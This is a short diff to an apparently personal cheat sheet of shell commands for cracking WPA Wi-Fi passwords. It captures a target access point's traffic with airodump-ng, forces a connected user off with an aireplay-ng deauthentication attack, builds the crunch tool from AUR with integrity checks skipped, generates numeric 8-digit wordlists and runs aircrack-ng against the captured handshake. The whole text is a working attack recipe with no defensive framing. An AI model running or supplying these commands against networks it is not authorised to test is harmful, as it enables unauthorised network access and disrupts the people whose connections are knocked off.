@@ -24,18 +24,31 @@ airodump-ng <interface>mon
 # target dump
 airodump-ng -c <channel> --bssid <ap> -w <dump name> <interface>mon
 
+#need beacons ~6000min
+
 # active attack
 aireplay-ng -0 3 -a <ap> -c <user> <interface>
 
 
 #create pass list (if not exist)
 
+#using crunch
+
+cd ~/
+mkdir crunch-build
+cd ~/crunch-build
+
+git clone https://aur.archlinux.org/crunch.git
+cd crunch
+makepkg -si --skipinteg
+
 # create simple password list with only numbers
-crunch 8 8 0123456789 -o ~/hs/pass.txt
+crunch 8 8 0123456789 -o ~/hs/pass.dict
 
 # or create revert list
-crunch 8 8 0987654321 -o ~/hs/pass_rev.txt
+crunch 8 8 0987654321 -o ~/hs/pass_rev.dict
 
 
 # crack
-aircrack-ng -b <ap> <dump>.cap -w ~/pass.txt
+cd ~/hs
+aircrack-ng -b <ap> <dump>.cap -w ~/hs/pass.dict
